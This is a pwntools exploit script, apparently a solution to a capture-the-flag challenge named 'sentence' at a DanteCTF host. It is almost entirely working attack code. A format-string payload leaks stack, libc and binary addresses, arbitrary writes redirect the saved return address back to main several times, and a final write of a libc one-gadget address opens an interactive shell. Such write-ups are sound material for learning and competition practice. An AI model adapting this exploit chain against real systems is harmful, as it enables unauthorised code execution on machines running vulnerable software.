#!/usr/bin/python3

from pwn import *

exe = ELF('sentence_patched', checksec=False)
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main +384
                b*main+233
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('challs.dantectf.it', 31532)
else:
    p = process(exe.path)
GDB()


payload = b"%p%3$p%13$p"
sla(b"name: \n", payload)
p.recvuntil(b"Hi, ")


stack_leak = int(p.recv(14), 16)
libc_leak = int(p.recv(14), 16)
exe_leak = int(p.recv(14), 16) 

info("stack leak: " + hex(stack_leak))
info("libc leak: " + hex(libc_leak))
info("exe leak: " + hex(exe_leak))

ret = stack_leak + 8520
libc.address = libc_leak - 1133111
exe.address = exe_leak - 4649

info("ret: " + hex(ret))
info("libc base: " + hex(libc.address))
info("exe base: " + hex(exe.address))


sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*2))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*3))
onegadget = libc.address + 0xebdb3
# payload = f"%{0}c%10$hhn".encode()
# sla(b"name: \n", payload)
# sla(b"hell: \n", str(onegadget))
# sla(b"/her: \n", str(ret+16*4))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*4))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*5))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*6))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*7))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*8))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*9))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*10))

sla(b"name: \n", payload)
sla(b"hell: \n", str(exe.sym['main']+5))
sla(b"/her: \n", str(ret+16*11))

sla(b"name: \n", payload)
sla(b"hell: \n", str(onegadget))
sla(b"/her: \n", str(ret+16*12))

p.interactive()
